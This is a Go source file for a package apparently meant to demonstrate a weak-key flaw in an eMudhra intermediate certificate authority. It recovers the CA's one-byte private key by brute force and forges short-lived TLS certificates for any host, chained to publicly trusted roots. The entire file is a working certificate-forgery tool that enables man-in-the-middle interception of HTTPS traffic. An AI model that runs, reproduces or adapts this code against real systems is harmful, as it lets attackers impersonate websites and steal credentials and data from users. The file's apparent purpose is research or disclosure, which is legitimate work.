// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: GPL-3.0-or-later

// Package certforge creates short-lived leaf certificates using one of the
// publicly recoverable eMudhra intermediate CA keys.
package certforge

import (
	"bytes"
	"crypto/ecdh"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	_ "embed"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"strings"
	"time"
)

const (
	sectigoIntermediateFingerprint = "45a883f349aedfd5f3a649b5498ffb121712ba8b448f3f2a91dbc5a766fcddbe"
	directIntermediateFingerprint  = "42c4accd12c4f59597925e1a08a7a90102608543809308d50ec427e118ba1493"
	directParentFingerprint        = "3094025792039a68af6e553686410bdab7c0d4a36b9084cba64202e35d6ebbdd"
	intermediateSPKIFingerprint    = "ebed6475c2c2d80fcb199f3fe8dd6e6b3ce60b77eb15d4e42c3dec0c6f5b5105"
	intermediateScalar             = int64(156)
	leafLifetime                   = 24 * time.Hour
)

//go:embed em_dv_tls_ca_g3b.pem
var sectigoIntermediatePEM []byte

//go:embed em_dv_tls_ca_g3b_direct.pem
var directIntermediatePEM []byte

//go:embed emsign_root_tls_ca_g3.pem
var directParentPEM []byte

// Chain identifies the trust path presented to the wrapped client.
type Chain string

const (
	// ChainSectigo uses the weak key cross-signed by AAA Certificate Services.
	ChainSectigo Chain = "sectigo"
	// ChainEMSign uses the direct eMudhra path to emSign ECC Root CA - G3.
	ChainEMSign Chain = "emsign"
)

// Options supplies testable dependencies to New. Zero values use secure
// production defaults.
type Options struct {
	Now   func() time.Time
	Rand  io.Reader
	Chain Chain
}

// Forge holds the compromised intermediate certificate and its recovered key.
type Forge struct {
	intermediate *x509.Certificate
	chain        []*x509.Certificate
	issuerKey    *ecdsa.PrivateKey
	now          func() time.Time
	rand         io.Reader
}

// New validates the embedded public certificate and reconstructs its private
// key from the publicly disclosed one-byte scalar.
func New(options Options) (*Forge, error) {
	now := options.Now
	if now == nil {
		now = time.Now
	}
	random := options.Rand
	if random == nil {
		random = rand.Reader
	}

	chain := options.Chain
	if chain == "" {
		chain = ChainSectigo
	}
	intermediate, additionalChain, err := parseChain(chain)
	if err != nil {
		return nil, err
	}
	issuerKey, err := recoverIssuerKey(intermediate)
	if err != nil {
		return nil, err
	}

	return &Forge{
		intermediate: intermediate,
		chain:        additionalChain,
		issuerKey:    issuerKey,
		now:          now,
		rand:         random,
	}, nil
}

// Certificate creates a short-lived certificate for host and returns it with
// the compromised intermediate as the presented chain.
func (f *Forge) Certificate(host string) (tls.Certificate, error) {
	validatedHost, err := validateHost(host)
	if err != nil {
		return tls.Certificate{}, err
	}

	now := f.now().UTC()
	if now.Before(f.intermediate.NotBefore) || !now.Before(f.intermediate.NotAfter) {
		return tls.Certificate{}, fmt.Errorf(
			"compromised intermediate is not valid at %s (valid %s to %s)",
			now.Format(time.RFC3339),
			f.intermediate.NotBefore.Format(time.RFC3339),
			f.intermediate.NotAfter.Format(time.RFC3339),
		)
	}

	leafKey, err := ecdsa.GenerateKey(elliptic.P256(), f.rand)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("generate leaf key: %w", err)
	}
	serial, err := rand.Int(f.rand, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("generate leaf serial: %w", err)
	}
	if serial.Sign() == 0 {
		serial.SetInt64(1)
	}

	notAfter := now.Add(leafLifetime)
	if notAfter.After(f.intermediate.NotAfter) {
		notAfter = f.intermediate.NotAfter
	}
	template := &x509.Certificate{
		SerialNumber: serial,
		Subject: pkix.Name{
			CommonName: validatedHost,
		},
		NotBefore:             now.Add(-5 * time.Minute),
		NotAfter:              notAfter,
		KeyUsage:              x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		AuthorityKeyId:        f.intermediate.SubjectKeyId,
	}
	if ip := net.ParseIP(validatedHost); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{validatedHost}
	}

	leafDER, err := x509.CreateCertificate(f.rand, template, f.intermediate, &leafKey.PublicKey, f.issuerKey)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("sign leaf certificate: %w", err)
	}
	leaf, err := x509.ParseCertificate(leafDER)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("parse generated leaf certificate: %w", err)
	}
	if err := leaf.CheckSignatureFrom(f.intermediate); err != nil {
		return tls.Certificate{}, fmt.Errorf("verify generated leaf signature: %w", err)
	}

	presentedChain := make([][]byte, 0, 2+len(f.chain))
	presentedChain = append(presentedChain, leafDER, f.intermediate.Raw)
	for _, certificate := range f.chain {
		presentedChain = append(presentedChain, certificate.Raw)
	}
	return tls.Certificate{
		Certificate: presentedChain,
		PrivateKey:  leafKey,
		Leaf:        leaf,
	}, nil
}

func parseChain(chain Chain) (*x509.Certificate, []*x509.Certificate, error) {
	switch chain {
	case ChainSectigo:
		intermediate, err := parseCertificate(sectigoIntermediatePEM, sectigoIntermediateFingerprint)
		return intermediate, nil, err
	case ChainEMSign:
		intermediate, err := parseCertificate(directIntermediatePEM, directIntermediateFingerprint)
		if err != nil {
			return nil, nil, err
		}
		parent, err := parseCertificate(directParentPEM, directParentFingerprint)
		if err != nil {
			return nil, nil, err
		}
		if err := intermediate.CheckSignatureFrom(parent); err != nil {
			return nil, nil, fmt.Errorf("verify direct eMudhra chain: %w", err)
		}
		return intermediate, []*x509.Certificate{parent}, nil
	default:
		return nil, nil, fmt.Errorf("unsupported certificate chain %q", chain)
	}
}

func parseCertificate(certificatePEM []byte, fingerprint string) (*x509.Certificate, error) {
	block, _ := pem.Decode(certificatePEM)
	if block == nil || block.Type != "CERTIFICATE" {
		return nil, errors.New("decode embedded eMudhra certificate")
	}
	certificate, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("parse embedded eMudhra certificate: %w", err)
	}
	if err := verifyFingerprint(certificate, fingerprint); err != nil {
		return nil, err
	}
	return certificate, nil
}

func verifyFingerprint(certificate *x509.Certificate, expected string) error {
	digest := sha256.Sum256(certificate.Raw)
	if hex.EncodeToString(digest[:]) != expected {
		return errors.New("embedded eMudhra intermediate fingerprint does not match pinned value")
	}
	return nil
}

func recoverIssuerKey(intermediate *x509.Certificate) (*ecdsa.PrivateKey, error) {
	publicKey, ok := intermediate.PublicKey.(*ecdsa.PublicKey)
	if !ok || publicKey.Curve != elliptic.P384() {
		return nil, errors.New("embedded eMudhra intermediate does not use P-384")
	}

	target, err := publicKey.ECDH()
	if err != nil {
		return nil, fmt.Errorf("convert embedded eMudhra public key: %w", err)
	}
	var recoveredScalar int64
	for candidate := int64(1); candidate < 256; candidate++ {
		scalar := make([]byte, 48)
		scalar[len(scalar)-1] = byte(candidate)
		candidateKey, candidateErr := ecdh.P384().NewPrivateKey(scalar)
		if candidateErr != nil {
			return nil, fmt.Errorf("derive P-384 candidate %d: %w", candidate, candidateErr)
		}
		if bytes.Equal(candidateKey.PublicKey().Bytes(), target.Bytes()) {
			recoveredScalar = candidate
			break
		}
	}
	if recoveredScalar != intermediateScalar {
		return nil, fmt.Errorf(
			"recovered unexpected eMudhra scalar %d, expected %d",
			recoveredScalar,
			intermediateScalar,
		)
	}
	publicKeyDER, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		return nil, fmt.Errorf("marshal embedded eMudhra public key: %w", err)
	}
	digest := sha256.Sum256(publicKeyDER)
	if hex.EncodeToString(digest[:]) != intermediateSPKIFingerprint {
		return nil, errors.New("embedded eMudhra SPKI fingerprint does not match pinned value")
	}

	scalar := make([]byte, 48)
	scalar[len(scalar)-1] = byte(recoveredScalar)
	issuerKey, err := ecdsa.ParseRawPrivateKey(elliptic.P384(), scalar)
	if err != nil {
		return nil, fmt.Errorf("parse recovered eMudhra private key: %w", err)
	}
	return issuerKey, nil
}

func validateHost(host string) (string, error) {
	host = strings.TrimSuffix(strings.TrimSpace(host), ".")
	if host == "" {
		return "", errors.New("certificate host is empty")
	}
	if len(host) > 253 || strings.ContainsAny(host, "\x00\r\n/\\") {
		return "", fmt.Errorf("invalid certificate host %q", host)
	}
	return host, nil
}
